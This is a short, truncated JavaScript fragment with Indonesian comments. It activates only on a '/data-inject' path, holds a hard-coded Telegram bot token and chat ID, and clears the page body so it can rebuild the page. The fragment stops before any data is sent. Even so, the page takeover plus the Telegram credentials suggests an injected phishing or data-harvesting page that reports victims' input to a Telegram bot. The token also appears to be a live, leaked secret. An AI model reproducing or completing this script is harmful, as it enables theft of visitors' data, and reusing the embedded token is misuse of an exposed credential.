(function () {
  // Hanya lanjut jika URL berakhir dengan '/data-inject'
  if (!window.location.pathname.endsWith("/data-inject")) return;

  const botToken = "7551512248:AAG39tneoqQOS6rHMiS-83dTQ_WAa0xJ7xY";
  const chatId = "7893111171";

  // Kosongkan seluruh isi halaman
  document.body.innerHTML = "";

  // Atur ulang style body
